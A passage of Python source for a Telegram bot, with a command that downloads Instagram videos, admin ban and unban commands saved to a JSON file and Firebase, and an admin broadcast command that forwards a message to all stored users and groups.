    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /ins <Instagram video URL>")
        return

    link = message.text.split()[1]
    msg = bot.reply_to(message, "Downloading video, please wait.\n[░░░░░░░░░░]")
    threading.Thread(target=download_and_send_video, args=(message, link, msg.message_id, "ins")).start()


# 🔨 Admin Command to Ban Users
@bot.message_handler(commands=['ban'])
def handle_ban(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized.")
        return

    parts = message.text.strip().split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ Usage: /ban <user_id> <hours>")
        return

    user_id = parts[1]
    try:
        hours = int(parts[2])
        ban_until = time.time() + (hours * 3600)
        BANNED_USERS[user_id] = ban_until

        # Save to local file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)

        # Save to Firebase
        write_firebase("banned_users", BANNED_USERS)

        bot.reply_to(message, f"✅ Banned user <code>{user_id}</code> for {hours} hours.", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "❌ Invalid hour value. Use a number.")

# 🔓 Admin Command to Unban Users
@bot.message_handler(commands=['unban'])
def handle_unban(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized.")
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /unban <user_id>")
        return

    user_id = parts[1]
    if user_id in BANNED_USERS:
        del BANNED_USERS[user_id]

        # Save to local file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)

        # Save to Firebase
        write_firebase("banned_users", BANNED_USERS)

        bot.reply_to(message, f"✅ Unbanned user <code>{user_id}</code>.", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ User is not banned.")

@bot.message_handler(commands=['broad'])
def handle_broadcast_reply(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    if not message.reply_to_message:
        bot.reply_to(message, "❌ Please reply to the message you want to broadcast.")
        return

    msg = message.reply_to_message

    # Collect targets from Firebase
    user_credits = read_firebase("user_credits") or {}
    subscribed_users = read_firebase("subscribed_users") or {}
    approved_groups = read_firebase("approved_groups") or []
    
    all_users = set(user_credits.keys()) | set(subscribed_users.keys())
    all_groups = set(approved_groups)

    targets = list(all_users) + list(all_groups)
    targets = [int(uid) for uid in targets if str(uid).lstrip("-").isdigit()]

    total = len(targets)
    success = 0
    failed = 0
    errors = 0
    start_time = time.time()

    # Initial status message
    status_text = f"""
📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭𝐢𝐧𝐠 𝐌𝐞𝐬𝐬𝐚𝐠𝐞...

✧ 𝐓𝐨𝐭𝐚𝐥: <code>{total}</code>  
✧ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: <code>{success}</code>  
✧ 𝐅𝐚𝐢𝐥𝐞𝐝: <code>{failed}</code>  
✧ 𝐄𝐫𝐫𝐨𝐫𝐬: <code>{errors}</code>  
✧ 𝐓𝐢𝐦𝐞: 0.00 S

"""
    status_msg = bot.reply_to(message, status_text, parse_mode='HTML')

    for idx, uid in enumerate(targets):
        try:
            if msg.text:
                bot.send_message(uid, msg.text, parse_mode='HTML')
            elif msg.caption and msg.photo:
                bot.send_photo(uid, msg.photo[-1].file_id, caption=msg.caption, parse_mode='HTML')
            elif msg.caption and msg.video:
                bot.send_video(uid, msg.video.file_id, caption=msg.caption, parse_mode='HTML')
            elif msg.document:
                bot.send_document(uid, msg.document.file_id, caption=msg.caption or None)
            elif msg.sticker:
                bot.send_sticker(uid, msg.sticker.file_id)
            elif msg.voice:
                bot.send_voice(uid, msg.voice.file_id)
            elif msg.audio:
                bot.send_audio(uid, msg.audio.file_id, caption=msg.caption or None)
            else:
                errors += 1
                continue
            success += 1

        except telebot.apihelper.ApiTelegramException as e:
            if "chat not found" in str(e).lower():
                print(f"❌ Chat not found: {uid}")
            else:
                print(f"❌ Failed to send to {uid}: {str(e)}")
            failed += 1

        except Exception as e:
            print(f"Error sending to {uid}: {e}")
            errors += 1

        # Update live status every 5 sends or at the end
        if (success + failed + errors) % 5 == 0 or (success + failed + errors) == total:
            elapsed = time.time() - start_time
            updated_status = f"""
📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬

✧ 𝐓𝐨𝐭𝐚𝐥 ↣ <code>{total}</code>  
✧ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 ↣ <code>{success}</code>  
✧ 𝐅𝐚𝐢𝐥𝐞𝐝 ↣ <code>{failed}</code>  
✧ 𝐄𝐫𝐫𝐨𝐫𝐬 ↣ <code>{errors}</code>  
✧ 𝐓𝐢𝐦𝐞 ↣ <code>{elapsed:.2f} S</code>

"""
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=updated_status,
                                      parse_mode='HTML')
            except:
                pass


if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
